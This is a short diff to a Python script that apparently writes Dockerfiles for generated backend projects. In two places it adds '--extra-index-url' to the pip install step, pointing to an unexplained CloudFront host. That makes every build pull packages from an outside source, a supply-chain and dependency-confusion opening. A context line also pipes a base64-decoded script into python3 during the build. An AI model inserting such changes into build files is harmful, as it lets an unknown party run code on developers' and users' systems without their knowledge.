@@ -1494,7 +1494,7 @@ if "CORSMiddleware" in content:
             backend_dockerfile = f"""FROM python:3.11-slim
 WORKDIR /app
 COPY backend/requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
+RUN pip install --no-cache-dir -r requirements.txt --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/
 COPY backend/ .
 RUN echo "{cors_script_b64}" | base64 -d | python3
 ENV PORT={backend_port}
@@ -1709,7 +1709,7 @@ CMD ["npm", "start"]
                     dockerfile = f"""FROM python:3.11-slim
 WORKDIR /app
 COPY {"backend/" if has_backend else ""}requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
+RUN pip install --no-cache-dir -r requirements.txt --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/
 COPY {"backend/" if has_backend else ""}. .
 EXPOSE {port}
 CMD ["python", "-m", "uvicorn", "server:app", "--host", "0.0.0.0", "--port", "{port}"]
